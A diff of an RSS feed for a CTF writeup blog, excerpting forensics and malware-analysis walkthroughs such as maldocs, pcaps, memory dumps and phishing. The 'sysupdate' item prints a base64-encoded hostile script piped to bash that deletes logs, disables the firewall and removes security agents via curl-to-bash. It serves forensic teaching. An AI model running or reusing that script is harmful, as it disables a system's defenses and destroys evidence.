@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
     <title>Ctfwriteups on Journal of Connar</title>
-    <link>http://localhost:1313/ctfwriteups/</link>
+    <link>https://connar.github.io/ctfwriteups/</link>
     <description>Recent content in Ctfwriteups on Journal of Connar</description>
     <generator>Hugo -- 0.134.3</generator>
     <language>en-us</language>
-    <atom:link href="http://localhost:1313/ctfwriteups/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="https://connar.github.io/ctfwriteups/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>An email from aunt Chloe - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/anemailfromauntchloe/</link>
+      <link>https://connar.github.io/ctfwriteups/anemailfromauntchloe/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/anemailfromauntchloe/</guid>
+      <guid>https://connar.github.io/ctfwriteups/anemailfromauntchloe/</guid>
       <description>&lt;h2 id=&#34;starting-the-analysis&#34;&gt;Starting the analysis&lt;/h2&gt;
 &lt;p&gt;In this challenge we are provided with a .rar file. We can extract the following files from this archive:&lt;/p&gt;
 &lt;ul&gt;
@@ -19,36 +19,36 @@
 &lt;li&gt;A txt named “RecipeForClassicBreadStuffing.txt”&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;If we pay attention to the txt file, we will notice that it is actually a vbs script. If we open it and view its contents we are met with the following code:
-&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ntua/emailAuntChloe1.png&#34; alt=&#34;contents vbs&#34;  /&gt;
+&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ntua/emailAuntChloe1.png&#34; alt=&#34;contents vbs&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;What this script is doing is:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Ancient Cave Vault - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/ancientcavevault/</link>
+      <link>https://connar.github.io/ctfwriteups/ancientcavevault/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/ancientcavevault/</guid>
+      <guid>https://connar.github.io/ctfwriteups/ancientcavevault/</guid>
       <description>&lt;p&gt;This is a ‘secret password’ type of challenge, where we need to somehow reverse engineer the given executable and find the correct password:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/pmdk/ancientcavevault/acv1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/pmdk/ancientcavevault/acv1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;After the final wrong attempt, the executable closes:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/pmdk/ancientcavevault/acv2.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/pmdk/ancientcavevault/acv2.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;So how can we find the correct password for the executable? Well, we first need to review its code. If you run the ‘file’ command on the given file, you will find out that this is a Mono/.Net assembly, and if you search up with how to decompile (reverse) these type of programs/applications, a tool named DnSpy will come up which is a tool used for exactly that – decompile/debug .net executables.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Another malicious doc - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/anothermaliciousdoc/</link>
+      <link>https://connar.github.io/ctfwriteups/anothermaliciousdoc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/anothermaliciousdoc/</guid>
+      <guid>https://connar.github.io/ctfwriteups/anothermaliciousdoc/</guid>
       <description>&lt;p&gt;Upon decompressing the provided file, we were presented with a Word document. Opening it, we are presented with the following:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/anothermaldoc/amd1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/anothermaldoc/amd1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Avoiding to click on “Enable Content”, we navigate to the panel where the macro code exists and see the following seemingly obfuscated VBA code:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/anothermaldoc/amd2.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/anothermaldoc/amd2.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;One way we can deobfuscate this is utilizing the ChatGPT AI service:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/anothermaldoc/amd3.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/anothermaldoc/amd3.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Just by asking ChatGPT to deobfuscate the code, we are provided with a much more clear version of the found macros.&lt;br&gt;
 Unfortunately, this will end up being a dead end and will give us no leads whatsoever about finding the flag.
@@ -56,32 +56,32 @@ In cases like this, we should turn to tools such as “olevba”, which is a too
     </item>
     <item>
       <title>captcha 4 humans - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/captcha4humans/</link>
+      <link>https://connar.github.io/ctfwriteups/captcha4humans/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/captcha4humans/</guid>
+      <guid>https://connar.github.io/ctfwriteups/captcha4humans/</guid>
       <description>&lt;p&gt;For this challenge you would normally fire up a docker instance that unfortunately you can&amp;rsquo;t have access at the time, but the py script that runs on the server is provided to you in case you need to run it locally. Now, onto the chall!&lt;/p&gt;
 &lt;p&gt;The concept of this challenge is about rainbow table attacks. The user is given the 5 first characters of an md5 hash of a random hex string. The goal is to compute all possible md5 hashes and construct a dictionary with key being the 5-characters start of the hash and value being the original string. Basically, this challenge’s code is its solution.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Chinese Windows Updater - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/chinesewindowsupgrader/</link>
+      <link>https://connar.github.io/ctfwriteups/chinesewindowsupgrader/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/chinesewindowsupgrader/</guid>
+      <guid>https://connar.github.io/ctfwriteups/chinesewindowsupgrader/</guid>
       <description>&lt;p&gt;Upon opening the file, we are presented with a memory dump and a batch script. Initially, the batch script appears to have been obfuscated:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/chinesewindowsupdater/cwu1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/chinesewindowsupdater/cwu1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Moreover, the memory dump alone does not yield any useful insights.&lt;br&gt;
 Therefore, the initial approach is to utilize search engines, such as Google, to gain an understanding of the nature and potential purpose of the batch script:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/chinesewindowsupdater/cwu2.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/chinesewindowsupdater/cwu2.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Upon conducting a search, we discover several posts that appear to be relevant to the challenge and could potentially guide us towards a solution.&lt;br&gt;
 Of particular interest is the first post, which features a script that bears a striking resemblance to our own:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Empire is at Risk - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/empirec2/</link>
+      <link>https://connar.github.io/ctfwriteups/empirec2/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/empirec2/</guid>
+      <guid>https://connar.github.io/ctfwriteups/empirec2/</guid>
       <description>&lt;h1 id=&#34;intro&#34;&gt;Intro&lt;/h1&gt;
 &lt;p&gt;In this challenge we are given:&lt;/p&gt;
 &lt;blockquote&gt;
@@ -94,82 +94,82 @@ Of particular interest is the first post, which features a script that bears a s
     </item>
     <item>
       <title>Flag on the run - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/flagontherun/</link>
+      <link>https://connar.github.io/ctfwriteups/flagontherun/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/flagontherun/</guid>
+      <guid>https://connar.github.io/ctfwriteups/flagontherun/</guid>
       <description>&lt;p&gt;Unzipping the provided file, we extract the following files:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/flagontherun/flagontherun1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/flagontherun/flagontherun1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;This time we don’t have only a “.pcap” file but also a file named sslkeylog.log, which when opened does not make a lot of sense:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/flagontherun/flagontherun2.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/flagontherun/flagontherun2.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;So we will ignore this for now and open the provided “.pcap” file with Wireshark:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/flagontherun/flagontherun3.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/flagontherun/flagontherun3.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;This time, packets are not that clear as in the previous challenge. We have a lot more packets and many different protocols. To view all protocols detected by Wireshark, we can navigate to “Statistics  Protocol Hierarchy” and get the following information:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Headstream - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/headstream/</link>
+      <link>https://connar.github.io/ctfwriteups/headstream/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/headstream/</guid>
+      <guid>https://connar.github.io/ctfwriteups/headstream/</guid>
       <description>&lt;p&gt;We&amp;rsquo;ve been given a game to analyze that is supposedly malicious. Downloading the Game.rar file, we are met with an executable named &amp;ldquo;GTAVI.exe&amp;rdquo;.&lt;br&gt;
 Upon running it inside a Virtual Machine (which should never be done in local systems when analyzing malware), the following error messages appear:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/headstream/headstream1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/headstream/headstream1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;And after clicking the &amp;lsquo;OK&amp;rsquo; button:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/headstream/headstream2.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/headstream/headstream2.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Since we know that there is more to the challenge than just error messages, we ignore them and try to analyze the executable inside Ghidra tool which is basically a reverse engineering tool. This will end up being a rabbit whole. The most informative artifact we can find is the following:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Hidden Gem Mixtape - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/hgm/</link>
+      <link>https://connar.github.io/ctfwriteups/hgm/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/hgm/</guid>
+      <guid>https://connar.github.io/ctfwriteups/hgm/</guid>
       <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
-&lt;p&gt;This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author &lt;strong&gt;bquanman&lt;/strong&gt; for providing the chall and giving me the change to play them after 3 years:D&lt;/p&gt;
-&lt;p&gt;In this challenge we are given a &lt;code&gt;.pcap&lt;/code&gt; file and a &lt;code&gt;.vhdx&lt;/code&gt; file. Without having the description, and since the challenge provided a network traffic file and a virtual filesystem, I assumed that something malicious happened and thereafter a pcap was generated to analyze a possibly maliciously established connection/data exfiltration. So I started analyzing the &lt;code&gt;.vhdx&lt;/code&gt; file.&lt;/p&gt;</description>
+&lt;p&gt;This challenge is one of the forensic challenges from the Idek CTF 2022. I wanted to play this for a long time because I had heard that it was really really good, but the links containing it ended up getting expired, so big thanks to the author &lt;strong&gt;bquanman&lt;/strong&gt; for providing the chall and giving me the chance to play them after 3 years:D&lt;/p&gt;
+&lt;p&gt;In this challenge we are given a &lt;code&gt;.pcap&lt;/code&gt; file and a &lt;code&gt;.vhdx&lt;/code&gt; file and the challenge consists of 3 parts.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Hinting flags - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/hintingflags/</link>
+      <link>https://connar.github.io/ctfwriteups/hintingflags/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/hintingflags/</guid>
+      <guid>https://connar.github.io/ctfwriteups/hintingflags/</guid>
       <description>&lt;p&gt;Extracting the contents of the zip file, we are met with a &amp;ldquo;Win7x64.mem” file. This is a memory dump file and can be analyzed with various tools. One of the tools that can analyze these type of files is called Volatility. Let’s see how it is used:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/hintingflags/hintingflags1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/hintingflags/hintingflags1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Volatility, based on the provided file, tries to match what type of system this dump was taken from. The first suggestion it makes is Win7SP1x64 which is basically Windows 7 – 64 bit.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Insider - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/insider/</link>
+      <link>https://connar.github.io/ctfwriteups/insider/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/insider/</guid>
+      <guid>https://connar.github.io/ctfwriteups/insider/</guid>
       <description>&lt;p&gt;The goal of this challenge is to find artifacts that prove the suspect user leaked some flags to a forum that hosts stolen databases for sale.  So this is what we have to look for. Downloading the file, we are met with a zip file which contains the following:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/insider/insider1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/insider/insider1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;A google search about .aut files is enough to find out that a tool called Autopsy is needed to analyze this file (although the file autopsy.db implies this as well).&lt;br&gt;
 Opening the challenge file in autopsy, we are met with the filesystem of the suspect user:&lt;/p&gt;</description>
     </item>
     <item>
       <title>IRS went phishing - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/irswentphishing/</link>
+      <link>https://connar.github.io/ctfwriteups/irswentphishing/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/irswentphishing/</guid>
+      <guid>https://connar.github.io/ctfwriteups/irswentphishing/</guid>
       <description>&lt;p&gt;We are provided with a .pst file which is essentially an outlook email file. We can either view it with online tools such as goldfynch or with command line tools such as readpst.&lt;/p&gt;
 &lt;p&gt;The goldfynch is the easier option so that’s what we are going to use:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/irswentphishing/irs1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/irswentphishing/irs1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;Opening the email, we view what seems to be a very sus message from presumably the IRS:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ctflib/irswentphishing/irs2.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ctflib/irswentphishing/irs2.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;</description>
     </item>
     <item>
       <title>Malware Carving - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/malwarecarving/</link>
+      <link>https://connar.github.io/ctfwriteups/malwarecarving/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/malwarecarving/</guid>
+      <guid>https://connar.github.io/ctfwriteups/malwarecarving/</guid>
       <description>&lt;p&gt;We are provided with a file named “pagefile.sys” which is used in virtual memory as said in the description of the challenge. Searching more on this file, we find:&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Pagefile.sys is a system file in Windows set aside for your computer&amp;#39;s Random Access Memory (RAM), also known as physical memory. When your computer&amp;#39;s RAM begins to run out of memory, it uses the pagefile to offload data it doesn&amp;#39;t need, such as files and apps.
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So based on that, we conclude that pagefile.sys has files and apps inside it and from the description of the challenge we are looking for a pdf file. But how can  we extract it ?&lt;br&gt;
@@ -177,21 +177,21 @@ By doing a little bit of research, we find that we can extract files based on th
     </item>
     <item>
       <title>Mr Anderson - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/mranderson/</link>
+      <link>https://connar.github.io/ctfwriteups/mranderson/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/mranderson/</guid>
+      <guid>https://connar.github.io/ctfwriteups/mranderson/</guid>
       <description>&lt;h1 id=&#34;this-is-a-writeup-for-the-mr-anderson-challenge&#34;&gt;This is a writeup for the Mr Anderson challenge&lt;/h1&gt;
 &lt;p&gt;This challenge gives us a zip file containing 3 pcap files:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/ecsc_gr2024/images/image.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/ecsc_gr2024/images/image.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.&lt;/p&gt;
 &lt;p&gt;We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Mr Beast Xmas Giveaway - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/xmasgiveaway/</link>
+      <link>https://connar.github.io/ctfwriteups/xmasgiveaway/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/xmasgiveaway/</guid>
+      <guid>https://connar.github.io/ctfwriteups/xmasgiveaway/</guid>
       <description>&lt;h2 id=&#34;starting-the-analysis&#34;&gt;Starting the analysis&lt;/h2&gt;
 &lt;p&gt;A pcap file is provided to the user. Pcap files are network capture files that provide an insight of what requests were made to what websites, the contents of each request and much more.&lt;/p&gt;
 &lt;p&gt;Opening the file with Wireshark, we can view all the requests.&lt;br&gt;
@@ -423,19 +423,19 @@ For this purpose, we can use the online tool:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Showerpell - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/showerpell/</link>
+      <link>https://connar.github.io/ctfwriteups/showerpell/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/showerpell/</guid>
+      <guid>https://connar.github.io/ctfwriteups/showerpell/</guid>
       <description>&lt;p&gt;In this challenge, we are given a pcap file. By observing the packets in the pcap, one is identified which appears to be transferring a file named &amp;ldquo;dnsexfil.ps1&amp;rdquo;. Using the option File &amp;ndash;&amp;gt; Export Objects &amp;ndash;&amp;gt; HTTP in Wireshark, this file can be downloaded for further analysis. You can retrieve this packet from Wireshark by going to File &amp;ndash;&amp;gt; Export Objects &amp;ndash;&amp;gt; HTTP.&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/pmdk/showerpell/showerpell1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/pmdk/showerpell/showerpell1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;With the help of a text editor, we can open this powershell script and view its contents:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Sloppy Encryptor - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/sloppyencryptor/</link>
+      <link>https://connar.github.io/ctfwriteups/sloppyencryptor/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/sloppyencryptor/</guid>
+      <guid>https://connar.github.io/ctfwriteups/sloppyencryptor/</guid>
       <description>&lt;h1 id=&#34;this-is-a-writeup-for-the-sloppy-encryptor-challenge&#34;&gt;This is a writeup for the sloppy encryptor challenge&lt;/h1&gt;
 &lt;p&gt;We are given an encrypted file containing unreadable text and the file used to produce it.&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;The encrypted text is: jkfdhlhfggkdekgkjfgkkgehhjjeflefgekiifehmmifdjigeldedleghhlejgeefehdeeffdkefefhkmiffkiefemeedemkmmehiidegjefefgfeefejfiifdmhlfdlidfifefieii
@@ -461,9 +461,9 @@ For this purpose, we can use the online tool:&lt;/p&gt;</description>
     </item>
     <item>
       <title>sysupdate - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/sysupdate/</link>
+      <link>https://connar.github.io/ctfwriteups/sysupdate/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/sysupdate/</guid>
+      <guid>https://connar.github.io/ctfwriteups/sysupdate/</guid>
       <description>&lt;p&gt;In this challenge we are given a bash script named sysupdate.sh. Viewing its contents we are met with the following suspicious commands:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IyEvYmluL3NoDQp1bGltaXQgLW4gNjU1MzUNCnN1ZG8gcmVib290DQpybSAtcmYgL3Zhci9sb2cvc3lzbG9nDQpjaGF0dHIgLWl1YSAvdG1wLw0KY2hhdHRyIC1pdWEgL3Zhci90bXAvDQpjaGF0dHIgLVIgLWkgL3Zhci9zcG9vbC9jcm9uDQpjaGF0dHIgLWkgL2V0Yy9jcm9udGFiDQp1ZncgZGlzYWJsZQ0KaXB0YWJsZXMgLUYNCmVjaG8gIlExUkdURWxDZTIwMGJERmpNVEIxTlY4MWVUVTNNMjFmZFhCa05EY3pOWDA9IiA+IC90bXAvbG9nX3JvdA0Kc3VkbyBzeXNjdGwga2VybmVsLm5taV93YXRjaGRvZz0wDQplY2hvICcwJyA+IC9wcm9jL3N5cy9rZXJuZWwvbm1pX3dhdGNoZG9nDQplY2hvICdrZXJuZWwubm1pX3dhdGNoZG9nPTAnID4+IC9ldGMvc3lzY3RsLmNvbmYNCnVzZXJkZWwga2V5DQp1c2VyZGVsIHZmaW5kZXINCmNoYXR0ciAtaWFlIC9yb290Ly5zc2gvDQpjaGF0dHIgLWlhZSAvcm9vdC8uc3NoL2F1dGhvcml6ZWRfa2V5cw0Kcm0gLXJmIC90bXAvYWRkcmVzKg0Kcm0gLXJmIC90bXAvd2FsbGUqDQpybSAtcmYgL3RtcC9rZXlzDQppZiBwcyBhdXggfCBncmVwIC1pICdbYV1saXl1bic7IHRoZW4NCgljdXJsIGh4eHA6Ly91cGRhdGUuYWVnaXMuYWxpeXVuLmNvbS9kb3dubG9hZC91bmluc3RhbGwuc2ggfCBiYXNoDQoJY3VybCBoeHhwOi8vdXBkYXRlLmFlZ2lzLmFsaXl1bi5jb20vZG93bmxvYWQvcXVhcnR6X3VuaW5zdGFsbC5zaCB8IGJhc2gJDQoJcGtpbGwgYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL2V0Yy9pbml0LmQvYWdlbnR3YXRjaCAvdXNyL3NiaW4vYWxpeXVuLXNlcnZpY2UNCglybSAtcmYgL3Vzci9sb2NhbC9hZWdpcyoNCglzeXN0ZW1jdGwgc3RvcCBhbGl5dW4uc2VydmljZQ0KCXN5c3RlbWN0bCBkaXNhYmxlIGFsaXl1bi5zZXJ2aWNlDQoJc2VydmljZSBiY20tYWdlbnQgc3RvcA0KCXl1bSByZW1vdmUgYmNtLWFnZW50IC15DQoJYXB0LWdldCByZW1vdmUgYmNtLWFnZW50IC15DQplbGlmIHBzIGF1eCB8IGdyZXAgLWkgJ1t5XXVuamluZyc7IHRoZW4NCgkvdXNyL2xvY2FsL2djbG91ZC9zdGFyZ2F0ZS9hZG1pbi91bmluc3RhbGwuc2g=&amp;#34;&lt;/span&gt; | base64 -d | bash -s
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We see the script decodes a b64 string and then runs it by piping it to bash.&lt;br&gt;
@@ -471,22 +471,22 @@ Let&amp;rsquo;s follow up with the script and decode it ourselves. We can do tha
     </item>
     <item>
       <title>Upgrading Windows - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/upgradingwindows/</link>
+      <link>https://connar.github.io/ctfwriteups/upgradingwindows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/upgradingwindows/</guid>
+      <guid>https://connar.github.io/ctfwriteups/upgradingwindows/</guid>
       <description>&lt;p&gt;In this test, we are given a &amp;ldquo;.cmd&amp;rdquo; script whose purpose is to upgrade the user&amp;rsquo;s version of Windows. However, the user reports that not only did the script not work, but also observed strange activity on their computer. Let&amp;rsquo;s analyze the file to see what we can find.&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/writeups/pmdk/upgradingwindows/upgradingWindows1.png&#34; alt=&#34;alt text&#34;  /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://connar.github.io/posts/writeups/pmdk/upgradingwindows/upgradingWindows1.png&#34; alt=&#34;alt text&#34;  /&gt;
 &lt;/p&gt;
 &lt;p&gt;We observe that indeed the script contains a portion of code that attempts to upgrade the Windows version, but it fails because there is an exit command in the middle that terminates its execution. However, just before the exit command, it does something very suspicious:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Weak Legacy - Writeup</title>
-      <link>http://localhost:1313/ctfwriteups/weaklegacy/</link>
+      <link>https://connar.github.io/ctfwriteups/weaklegacy/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <guid>http://localhost:1313/ctfwriteups/weaklegacy/</guid>
